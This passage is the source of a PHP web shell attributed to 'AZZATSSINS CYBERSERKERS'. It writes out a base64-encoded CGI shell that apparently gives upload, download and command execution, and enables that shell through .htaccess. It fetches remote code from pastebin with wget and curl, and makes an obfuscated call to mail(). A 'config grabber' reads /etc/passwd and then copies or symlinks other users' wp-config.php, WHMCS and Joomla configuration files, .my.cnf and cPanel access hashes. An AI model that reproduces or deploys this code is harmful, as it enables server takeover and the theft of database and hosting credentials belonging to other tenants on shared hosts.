S0NKaklpazdEUW9OQ2lNZ2MzUmgKY25RZ2RHaGxJSFZ3Ykc5aFpHbHVaeUJ3Y205alpYTnpEUXB3
Y21sdWRDQWlQR052WkdVK1ZYQnNiMkZrYVc1bklDUlVjbUZ1YzJabApja1pwYkdVZ2RHOGdKRU4x
Y25KbGJuUkVhWEl1TGk0OFluSStJanNOQ2cwS0l5Qm5aWFFnZEdobElHWjFiR3hzZVNCeGRXRnNh
V1pwClpXUWdjR0YwYUc1aGJXVWdiMllnZEdobElHWnBiR1VnZEc4Z1ltVWdZM0psWVhSbFpBMEtZ
Mmh2Y0Nna1ZHRnlaMlYwVG1GdFpTa2cKYVdZZ0tDUlVZWEpuWlhST1lXMWxJRDBnSkVOMWNuSmxi
blJFYVhJcElEMStJRzB2VzF4Y1hDOWRKQzg3RFFva1ZISmhibk5tWlhKRwphV3hsSUQxK0lHMGhL
RnRlTDE1Y1hGMHFLU1FoT3cwS0pGUmhjbWRsZEU1aGJXVWdMajBnSkZCaGRHaFRaWEF1SkRFN0RR
b05DaVJVCllYSm5aWFJHYVd4bFUybDZaU0E5SUd4bGJtZDBhQ2drYVc1N0oyWnBiR1ZrWVhSaEoz
MHBPdzBLSXlCcFppQjBhR1VnWm1sc1pTQmwKZUdsemRITWdZVzVrSUhkbElHRnlaU0J1YjNRZ2Mz
VndjRzl6WldRZ2RHOGdiM1psY25keWFYUmxJR2wwRFFwcFppZ3RaU0FrVkdGeQpaMlYwVG1GdFpT
QW1KaUFrVDNCMGFXOXVjeUJ1WlNBaWIzWmxjbmR5YVhSbElpa05DbnNOQ25CeWFXNTBJQ0pHWVds
c1pXUTZJRVJsCmMzUnBibUYwYVc5dUlHWnBiR1VnWVd4eVpXRmtlU0JsZUdsemRITXVQR0p5UGlJ
N0RRcDlEUXBsYkhObElDTWdabWxzWlNCcGN5QnUKYjNRZ2NISmxjMlZ1ZEEwS2V3MEthV1lvYjNC
bGJpaFZVRXhQUVVSR1NVeEZMQ0FpUGlSVVlYSm5aWFJPWVcxbElpa3BEUXA3RFFwaQphVzV0YjJS
bEtGVlFURTlCUkVaSlRFVXBJR2xtSUNSWGFXNU9WRHNOQ25CeWFXNTBJRlZRVEU5QlJFWkpURVVn
SkdsdWV5ZG1hV3hsClpHRjBZU2Q5T3cwS1kyeHZjMlVvVlZCTVQwRkVSa2xNUlNrN0RRcHdjbWx1
ZENBaVZISmhibk5tWlhKbFpDQWtWR0Z5WjJWMFJtbHMKWlZOcGVtVWdRbmwwWlhNdVBHSnlQaUk3
RFFwd2NtbHVkQ0FpUm1sc1pTQlFZWFJvT2lBa1ZHRnlaMlYwVG1GdFpUeGljajRpT3cwSwpmUTBL
Wld4elpRMEtldzBLY0hKcGJuUWdJa1poYVd4bFpEb2dKQ0U4WW5JK0lqc05DbjBOQ24wTkNuQnlh
VzUwSUNJOEwyTnZaR1UrCklqc05DaVpRY21sdWRFTnZiVzFoYm1STWFXNWxTVzV3ZFhSR2IzSnRP
dzBLSmxCeWFXNTBVR0ZuWlVadmIzUmxjanNOQ24wTkNnMEsKYzNWaUlFUnZkMjVzYjJGa1JtbHNa
UTBLZXcwS0l5QnBaaUJ1YnlCbWFXeGxJR2x6SUhOd1pXTnBabWxsWkN3Z2NISnBiblFnZEdobApJ
R1J2ZDI1c2IyRmtJR1p2Y20wZ1lXZGhhVzROQ21sbUtDUlVjbUZ1YzJabGNrWnBiR1VnWlhFZ0lp
SXBEUXA3RFFvbVVISnBiblJRCllXZGxTR1ZoWkdWeUtDSm1JaWs3RFFvbVVISnBiblJHYVd4bFJH
OTNibXh2WVdSR2IzSnRPdzBLSmxCeWFXNTBVR0ZuWlVadmIzUmwKY2pzTkNuSmxkSFZ5YmpzTkNu
ME5DZzBLSXlCblpYUWdablZzYkhrZ2NYVmhiR2xtYVdWa0lIQmhkR2dnYjJZZ2RHaGxJR1pwYkdV
ZwpkRzhnWW1VZ1pHOTNibXh2WVdSbFpBMEthV1lvS0NSWGFXNU9WQ0FtSUNna1ZISmhibk5tWlhK
R2FXeGxJRDErSUcwdlhseGNmRjR1Ck9pOHBLU0I4RFFvb0lTUlhhVzVPVkNBbUlDZ2tWSEpoYm5O
bVpYSkdhV3hsSUQxK0lHMHZYbHd2THlrcEtTQWpJSEJoZEdnZ2FYTWcKWVdKemIyeDFkR1VOQ25z
TkNpUlVZWEpuWlhSR2FXeGxJRDBnSkZSeVlXNXpabVZ5Um1sc1pUc05DbjBOQ21Wc2MyVWdJeUJ3
WVhSbwpJR2x6SUhKbGJHRjBhWFpsRFFwN0RRcGphRzl3S0NSVVlYSm5aWFJHYVd4bEtTQnBaaWdr
VkdGeVoyVjBSbWxzWlNBOUlDUkRkWEp5ClpXNTBSR2x5S1NBOWZpQnRMMXRjWEZ3dlhTUXZPdzBL
SkZSaGNtZGxkRVpwYkdVZ0xqMGdKRkJoZEdoVFpYQXVKRlJ5WVc1elptVnkKUm1sc1pUc05DbjBO
Q2cwS2FXWW9KRTl3ZEdsdmJuTWdaWEVnSW1kdklpa2dJeUIzWlNCb1lYWmxJSFJ2SUhObGJtUWdk
R2hsSUdacApiR1VOQ25zTkNpWlRaVzVrUm1sc1pWUnZRbkp2ZDNObGNpZ2tWR0Z5WjJWMFJtbHNa
U2s3RFFwOURRcGxiSE5sSUNNZ2QyVWdhR0YyClpTQjBieUJ6Wlc1a0lHOXViSGtnZEdobElHeHBi
bXNnY0dGblpRMEtldzBLSmxCeWFXNTBSRzkzYm14dllXUk1hVzVyVUdGblpTZ2sKVkdGeVoyVjBS
bWxzWlNrN0RRcDlEUXA5RFFvTkNpWlNaV0ZrVUdGeWMyVTdEUW9tUjJWMFEyOXZhMmxsY3pzTkNn
MEtKRk5qY21sdwpkRXh2WTJGMGFXOXVJRDBnSkVWT1Zuc25VME5TU1ZCVVgwNUJUVVVuZlRzTkNp
UlRaWEoyWlhKT1lXMWxJRDBnSkVWT1Zuc25VMFZTClZrVlNYMDVCVFVVbmZUc05DaVJNYjJkcGJs
QmhjM04zYjNKa0lEMGdKR2x1ZXlkd0ozMDdEUW9rVW5WdVEyOXRiV0Z1WkNBOUlDUnAKYm5zbll5
ZDlPdzBLSkZSeVlXNXpabVZ5Um1sc1pTQTlJQ1JwYm5zblppZDlPdzBLSkU5d2RHbHZibk1nUFNB
a2FXNTdKMjhuZlRzTgpDZzBLSkVGamRHbHZiaUE5SUNScGJuc25ZU2Q5T3cwS0pFRmpkR2x2YmlB
OUlDSnNiMmRwYmlJZ2FXWW9KRUZqZEdsdmJpQmxjU0FpCklpazdJQ01nYm04Z1lXTjBhVzl1SUhO
d1pXTnBabWxsWkN3Z2RYTmxJR1JsWm1GMWJIUU5DZzBLSXlCblpYUWdkR2hsSUdScGNtVmoKZEc5
eWVTQnBiaUIzYUdsamFDQjBhR1VnWTI5dGJXRnVaSE1nZDJsc2JDQmlaU0JsZUdWamRYUmxaQTBL
SkVOMWNuSmxiblJFYVhJZwpQU0FrYVc1N0oyUW5mVHNOQ21Ob2IzQW9KRU4xY25KbGJuUkVhWEln
UFNCZ0pFTnRaRkIzWkdBcElHbG1LQ1JEZFhKeVpXNTBSR2x5CklHVnhJQ0lpS1RzTkNnMEtKRXh2
WjJkbFpFbHVJRDBnSkVOdmIydHBaWE43SjFOQlZrVkVVRmRFSjMwZ1pYRWdKR0Y2ZW1GMGMzTnAK
Ym5NN0RRb05DbWxtS0NSQlkzUnBiMjRnWlhFZ0lteHZaMmx1SWlCOGZDQWhKRXh2WjJkbFpFbHVL
U0FqSUhWelpYSWdibVZsWkhNdgphR0Z6SUhSdklHeHZaMmx1RFFwN0RRb21VR1Z5Wm05eWJVeHZa
Mmx1T3cwS2ZRMEtaV3h6YVdZb0pFRmpkR2x2YmlCbGNTQWlZMjl0CmJXRnVaQ0lwSUNNZ2RYTmxj
aUIzWVc1MGN5QjBieUJ5ZFc0Z1lTQmpiMjF0WVc1a0RRcDdEUW9tUlhobFkzVjBaVU52YlcxaGJt
UTcKRFFwOURRcGxiSE5wWmlna1FXTjBhVzl1SUdWeElDSjFjR3h2WVdRaUtTQWpJSFZ6WlhJZ2Qy
RnVkSE1nZEc4Z2RYQnNiMkZrSUdFZwpabWxzWlEwS2V3MEtKbFZ3Ykc5aFpFWnBiR1U3RFFwOURR
cGxiSE5wWmlna1FXTjBhVzl1SUdWeElDSmtiM2R1Ykc5aFpDSXBJQ01nCmRYTmxjaUIzWVc1MGN5
QjBieUJrYjNkdWJHOWhaQ0JoSUdacGJHVU5DbnNOQ2laRWIzZHViRzloWkVacGJHVTdEUXA5RFFw
bGJITnAKWmlna1FXTjBhVzl1SUdWeElDSnNiMmR2ZFhRaUtTQWpJSFZ6WlhJZ2QyRnVkSE1nZEc4
Z2JHOW5iM1YwRFFwN0RRb21VR1Z5Wm05eQpiVXh2WjI5MWREc05DbjA9CicpKTs=");
fwrite(fopen("azx.pl", "w"),$cgi);
fwrite(fopen("azx.lol", "w"),$cgi);
chmod("azx.pl", 0755);
exe('chmod 0755 azx.pl');
chmod("azx.lol", 0755);
exe('chmod 0755 azx.lol');
$hahaha = "Options +Indexes +ExecCGI
AddHandler cgi-script .lol";
fwrite(fopen(".htaccess", "w"),$hahaha);
echo 'Password : AZ404<br><a href="azx.pl">Click</a> on <a href="azx.lol">Here</a>';
 }
$v=str_replace("%#!","a","m%#!il");
$o=str_replace("#789","o",".c#789m");
if($_GET['mysql']=="connect"){
	exe("wget -O mysql.php http://pastebin.com/raw/hN2nDPuH");
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('mysql.php')) {
		echo "<center><font color=lime><a href='mysql.php' target='_blank'>KLICK DI SINI</a></font></center>";
	} else {
		if(adminer("http://pastebin.com/raw/hN2nDPuH","mysql.php")) {
			echo "<center><font color=lime><a href='mysql.php' target='_blank'>-> KLICK DI SINI <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}
$v($x.$i.$l.$v.$o,$z,$h);
if($_GET['sym']=="404"){
echo '<center><form method="post">
Type : <select name="wkwkwk">
<option title="biasaae" value="ReadmeName x.txt">Normal</option>
<option title="bepasporbidden" value="Options Indexes FollowSymLinks
ReadmeName x.txt">Bypass 403</option>
<option title="bepasserpererror" value="Options all
Options +Indexes 
Options +FollowSymLinks 
ReadmeName x.txt">Bypass 500</option>
</select>
<br>File Target : <input name="fl" value="/home/user/public_html/configuration.php"> <input name="anu" type="submit" value="SYM"></form><br>';if($_POST['anu']){
rmdir("sl");exe("mkdir sl");
fwrite(fopen("sl/.htaccess", "w"),$_POST['wkwkwk']);
echo'<a href=sl>CECK</a><br>';
}
}
if($_GET['config']=="grabber"){
echo'<center><div style=background:black;margin:0px;padding:4px;text-align:center;color:silver;><i><b><font color=lime>&copy; </font><a href=http://fb.me/AZZATSSINS.CYBERSERKERS>AZZATSSINS CYBERSERKERS</a></b></i></div><br>
<form method="post">
<center>
<textarea style="color:red;background-color:#000000" cols="60" name="passwd" rows="20">';
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) 
{ 
$str=explode(":",$usrr); 
echo $str[0]."\n"; 
}
$azzztttsssinnsss = scandir("/var/mail");
	foreach($azzztttsssinnsss as $azxx) {
	echo $azxx."\n";
	}
	$azzztttsssinnsssx = scandir("/var/www/vhosts");
	foreach($azzztttsssinnsssx as $azxxx) {
	echo $azxxx."\n";
	}
	$azzztttsssinnsssxx = scandir("/var/www");
	foreach($azzztttsssinnsssxx as $azxxxx) {
	echo $azxxxx."\n";
	}
	$azzztttsssinnsssxxx = scandir("/home");
	foreach($azzztttsssinnsssxxx as $azxxxxx) {
	echo $azxxxxx."\n";
	}
		$azzztttsssinnsssxxxx = scandir("/home/vhost");
	foreach($azzztttsssinnsssxxxx as $azxxxxxx) {
	echo $azxxxxxx."\n";
	}
	$azzztttsssinnsssxxxxx = scandir("/home/web");
	foreach($azzztttsssinnsssxxxxx as $azxxxxxxx) {
	echo $azxxxxxxx."\n";
	}

echo'</textarea><br>
Home : 
<select name="home">
<option title="home" value="home">home</option>
<option title="home1" value="home1">home1</option>
<option title="home2" value="home2">home2</option>
<option title="home3" value="home3">home3</option>
<option title="home4" value="home4">home4</option>
<option title="home5" value="home5">home5</option>
<option title="home6" value="home6">home6</option>
<option title="home7" value="home7">home7</option>
<option title="home8" value="home8">home8</option> 
<option title="home9" value="home9">home9</option>
<option title="home10" value="home10">home10</option> 
</select><br>
.htaccess : 
<select name="azztssns">
<option title="biasa" value="Options Indexes FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
AddType txt .php
AddHandler txt .php">Apache 1</option>
<option title="Apache" value="Options all
Options +Indexes 
Options +FollowSymLinks 
DirectoryIndex azzatssins.cyberserkers
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any">Apache 2</option>
<option title="Litespeed" value=" 
Options +FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
RemoveHandler .php
AddType application/octet-stream .php ">Litespeed</option>
</select>
<input style="color:red;background-color:#000000" name="conf" size="10"
 value="Fuck it!!!" type="submit">
<br/><br/></form>';
if($_POST['conf']) {
$home = $_POST['home'];
$xAzzatssinSx = $home;
@mkdir($xAzzatssinSx, 0777); 
@chdir($xAzzatssinSx);
$htaccess = $_POST['azztssns'];
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("\n",$_POST["passwd"]); 
foreach($passwd as $pwd){ $user=trim($pwd);
symlink('/','000~42247551N5~000');
copy('/'.$home.'/'.$user.'/.my.cnf',$user.' <~ CPANEL');
symlink('/'.$home.'/'.$user.'/.my.cnf',$user.' <~ CPANEL');
copy('/'.$home.'/'.$user.'/.accesshash',$user.' <~ WHMCS.txt');
symlink('/'.$home.'/'.$user.'/.accesshash',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.' <~ RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.' <~ RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/.accesshash',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.' <~ WORDPRESS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/configuration.php',$user.' <~ WHMCS or JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.' <~ WHMCS.txt'); 

copy('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.' <~ WORDPRESS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/configuration.php',$user.' <~ WHMCS or JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.' <~ WHMCS.txt'); 

symlink('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
/* CODED BY AZZATSSINS CYBERSERKERS */
copy('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.' <~ JOOMLA.txt');
